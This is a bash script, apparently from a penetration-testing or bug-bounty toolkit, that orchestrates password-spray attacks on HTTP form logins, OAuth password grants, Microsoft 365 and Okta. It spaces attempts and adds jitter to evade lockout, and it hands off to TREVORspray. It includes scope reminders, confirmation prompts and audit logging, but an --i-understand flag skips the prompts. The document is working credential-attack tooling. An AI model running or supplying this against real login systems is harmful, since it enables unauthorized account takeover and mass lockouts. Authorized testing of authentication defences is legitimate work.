#!/bin/bash
# =============================================================================
# Spray Orchestrator — password spray with mandatory scope check + lockout warn
#
# Modes:
#   http-form   Generic HTTP form login (POST username/password to a URL)
#   oauth       OAuth password grant flow (POST grant_type=password)
#   o365        Microsoft 365 / Azure AD  (via TREVORspray)
#   okta        Okta SSO                  (via TREVORspray)
#
# Spray order: pass[i] × all_users per round, NOT brute-force per-user.
# This keeps each account at <=1 failed attempt per round, well below the
# typical 5-10 lockout threshold.
#
# Hard guards:
#   - Legal/scope reminder + typed-hostname confirmation (defeats wrong-target slips)
#   - Lockout warning + 'yes' confirmation (defeats casual launch)
#   - All attempts written to audit log JSONL
#   - Default delay 1800s + 60s jitter (--aggressive for 60s/10s)
#
# Usage:
#   tools/spray_orchestrator.sh <target-url> --mode http-form \
#       --users users.txt --passes ranked.txt
#   tools/spray_orchestrator.sh https://login.microsoftonline.com --mode o365 \
#       --users users.txt --passes ranked.txt
# =============================================================================

set -euo pipefail

TARGET_URL=""
MODE=""
USERS_FILE=""
PASSES_FILE=""
DELAY=1800
JITTER=60
AGGRESSIVE=false
DRY_RUN=false
CONTINUE_ON_HIT=false
I_UNDERSTAND=false

# HTTP-form-specific
POST_DATA=""
CSRF_EXTRACT=""
SUCCESS_REGEX=""
FAIL_REGEX=""

# OAuth-specific
OAUTH_TOKEN_URL=""
OAUTH_CLIENT_ID=""
OAUTH_CLIENT_SECRET=""
OAUTH_SCOPE=""

while [[ $# -gt 0 ]]; do
    case "$1" in
        --mode)            MODE="$2"; shift 2 ;;
        --users)           USERS_FILE="$2"; shift 2 ;;
        --passes)          PASSES_FILE="$2"; shift 2 ;;
        --delay)           DELAY="$2"; shift 2 ;;
        --jitter)          JITTER="$2"; shift 2 ;;
        --aggressive)      AGGRESSIVE=true; DELAY=60; JITTER=10; shift ;;
        --dry-run)         DRY_RUN=true; shift ;;
        --continue-on-hit) CONTINUE_ON_HIT=true; shift ;;
        --i-understand)    I_UNDERSTAND=true; shift ;;
        --post-data)       POST_DATA="$2"; shift 2 ;;
        --csrf-extract)    CSRF_EXTRACT="$2"; shift 2 ;;
        --success-regex)   SUCCESS_REGEX="$2"; shift 2 ;;
        --fail-regex)      FAIL_REGEX="$2"; shift 2 ;;
        --oauth-client-id)     OAUTH_CLIENT_ID="$2"; shift 2 ;;
        --oauth-client-secret) OAUTH_CLIENT_SECRET="$2"; shift 2 ;;
        --oauth-scope)         OAUTH_SCOPE="$2"; shift 2 ;;
        -h|--help) sed -n '2,30p' "$0" | sed 's/^# \{0,1\}//'; exit 0 ;;
        -*) echo "Unknown flag: $1" >&2; exit 1 ;;
        *) [ -z "$TARGET_URL" ] && TARGET_URL="$1" || { echo "Unexpected arg: $1" >&2; exit 1; }; shift ;;
    esac
done

GREEN='\033[0;32m'; RED='\033[0;31m'; YELLOW='\033[1;33m'; BOLD='\033[1m'; NC='\033[0m'
log_ok()   { echo -e "${GREEN}[+]${NC} $1"; }
log_warn() { echo -e "${YELLOW}[!]${NC} $1"; }
log_err()  { echo -e "${RED}[-]${NC} $1"; }
log_bold() { echo -e "${BOLD}$1${NC}"; }

# Validation
[ -z "$TARGET_URL" ]  && { log_err "Target URL required"; exit 1; }
[ -z "$MODE" ]        && { log_err "--mode required: http-form|oauth|o365|okta"; exit 1; }
[ -z "$USERS_FILE" ]  && { log_err "--users <file> required"; exit 1; }
[ -z "$PASSES_FILE" ] && { log_err "--passes <file> required"; exit 1; }
[ -f "$USERS_FILE" ]  || { log_err "Users file not found: $USERS_FILE"; exit 1; }
[ -f "$PASSES_FILE" ] || { log_err "Passes file not found: $PASSES_FILE"; exit 1; }

case "$MODE" in
    http-form|oauth|o365|okta) ;;
    *) log_err "Invalid mode: $MODE (use: http-form|oauth|o365|okta)"; exit 1 ;;
esac

# Target host extraction
TARGET_HOST="$(echo "$TARGET_URL" | sed -E 's|^https?://([^/:]+).*|\1|')"

# Counts
USER_COUNT=$(grep -c . "$USERS_FILE" || true)
PASS_COUNT=$(grep -c . "$PASSES_FILE" || true)
TOTAL_ATTEMPTS=$((USER_COUNT * PASS_COUNT))
ROUNDS=$PASS_COUNT
DURATION_SEC=$((ROUNDS * (DELAY + JITTER / 2)))
DURATION_HOURS=$((DURATION_SEC / 3600))
DURATION_DAYS=$((DURATION_HOURS / 24))

# Pre-flight
echo ""
echo "============================================="
log_bold "  SPRAY PRE-FLIGHT — $TARGET_HOST"
echo "============================================="
printf "  %-18s %s\n" "Target URL:"  "$TARGET_URL"
printf "  %-18s %s\n" "Mode:"        "$MODE"
printf "  %-18s %s (%d entries)\n" "Users file:"  "$USERS_FILE"  "$USER_COUNT"
printf "  %-18s %s (%d entries)\n" "Passes file:" "$PASSES_FILE" "$PASS_COUNT"
printf "  %-18s %d (= users × passes)\n" "Total attempts:" "$TOTAL_ATTEMPTS"
printf "  %-18s %d (= pass count)\n" "Rounds:" "$ROUNDS"
printf "  %-18s %ds + %ds jitter %s\n" "Delay/round:" "$DELAY" "$JITTER" \
    "$([ "$AGGRESSIVE" = true ] && echo "(--aggressive)" || echo "")"
printf "  %-18s ~%dh (%dd)\n" "Est. duration:" "$DURATION_HOURS" "$DURATION_DAYS"
printf "  %-18s %s\n" "Dry-run:" "$DRY_RUN"
echo "============================================="

# Hard guard 1: legal/scope reminder + typed-hostname confirmation
# Note: tools/scope_checker.py is a library (no enforcement CLI), so the real
# safety mechanism here is making the human re-state the target out loud.
echo ""
log_warn "${BOLD}LEGAL / SCOPE REMINDER${NC}"
log_warn "Credential spray requires EXPLICIT program permission. Most BBPs"
log_warn "list it under prohibited testing. Verify NOW, before continuing:"
log_warn "  - Run /scope $TARGET_HOST to confirm host is in scope"
log_warn "  - Read the program policy for 'credential stuffing', 'brute force',"
log_warn "    'authentication testing' — these are usually explicitly excluded"
log_warn "  - If unsure, ABORT and ask the program first"

if [ "$I_UNDERSTAND" != true ] && [ "$DRY_RUN" != true ]; then
    echo ""
    read -r -p "Type the target hostname ($TARGET_HOST) to confirm: " TYPED
    if [ "$TYPED" != "$TARGET_HOST" ]; then
        log_err "Hostname confirmation failed (typed '$TYPED', expected '$TARGET_HOST')"
        log_err "Aborting — this guard exists to prevent spraying the wrong target."
        exit 2
    fi
    log_ok "Target confirmed: $TARGET_HOST"
fi

# Hard guard 2: lockout warning + confirmation
echo ""
log_warn "${BOLD}LOCKOUT WARNING${NC}"
log_warn "Most lockout policies trigger at 5–10 failed attempts."
log_warn "  Per-user failed attempts (this run):  $ROUNDS"
if [ "$ROUNDS" -gt 5 ]; then
    LOCKOUT_PCT=$((ROUNDS > 10 ? 80 : ROUNDS * 10))
    log_warn "  Estimated accounts likely to be locked: ~${LOCKOUT_PCT}% of $USER_COUNT = $((USER_COUNT * LOCKOUT_PCT / 100))"
else
    log_warn "  Estimated lockout impact: LOW (rounds < typical threshold)"
fi
log_warn "Locked accounts may alert defenders and damage the program relationship."

if [ "$DRY_RUN" = true ]; then
    log_ok "Dry-run mode: would dispatch to '$MODE' handler but skipping execution"
    exit 0
fi

if [ "$I_UNDERSTAND" != true ]; then
    echo ""
    read -r -p "Type 'yes' to proceed (anything else aborts): " CONFIRM
    if [ "$CONFIRM" != "yes" ]; then
        log_warn "Aborted by user"
        exit 0
    fi
fi

# Audit log setup
AUDIT_DIR="recon/${TARGET_HOST}/spray"
mkdir -p "$AUDIT_DIR"
AUDIT_LOG="$AUDIT_DIR/attempts-$(date +%Y%m%dT%H%M%S).jsonl"
export AUDIT_LOG
log_ok "Audit log: $AUDIT_LOG"

# Common env for child processes
export SPRAY_DELAY="$DELAY"
export SPRAY_JITTER="$JITTER"
export SPRAY_CONTINUE_ON_HIT="$CONTINUE_ON_HIT"
export SPRAY_TARGET_URL="$TARGET_URL"
export SPRAY_USERS_FILE="$USERS_FILE"
export SPRAY_PASSES_FILE="$PASSES_FILE"

# Dispatch
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
echo ""
log_ok "Dispatching to '$MODE' handler"
echo ""

case "$MODE" in
    http-form)
        export SPRAY_POST_DATA="$POST_DATA"
        export SPRAY_CSRF_EXTRACT="$CSRF_EXTRACT"
        export SPRAY_SUCCESS_REGEX="$SUCCESS_REGEX"
        export SPRAY_FAIL_REGEX="$FAIL_REGEX"
        python3 "$SCRIPT_DIR/_spray_http_form.py"
        ;;
    oauth)
        export SPRAY_OAUTH_CLIENT_ID="$OAUTH_CLIENT_ID"
        export SPRAY_OAUTH_CLIENT_SECRET="$OAUTH_CLIENT_SECRET"
        export SPRAY_OAUTH_SCOPE="$OAUTH_SCOPE"
        python3 "$SCRIPT_DIR/_spray_oauth.py"
        ;;
    o365|okta)
        if ! command -v trevorspray &>/dev/null; then
            log_err "trevorspray not installed. Run: ./install_tools.sh --with-credential-attack"
            exit 1
        fi
        log_warn "Dispatching to TREVORspray (its own rate-limit/SSH-proxy machinery)"
        log_warn "Per-attempt audit log uses TREVOR output parsing — less granular than http-form mode"
        # TREVOR uses --delay in minutes for some modules, seconds for others.
        # Pass our seconds-based delay through; TREVOR will interpret.
        trevorspray --users "$USERS_FILE" --passlist "$PASSES_FILE" \
            --url "$TARGET_URL" \
            --delay "$((DELAY / 60))" \
            --jitter "$JITTER" \
            $([ "$CONTINUE_ON_HIT" = true ] || echo "--no-loot")  \
            2>&1 | tee -a "$AUDIT_LOG"
        ;;
esac

echo ""
log_ok "Spray run complete. Audit log: $AUDIT_LOG"
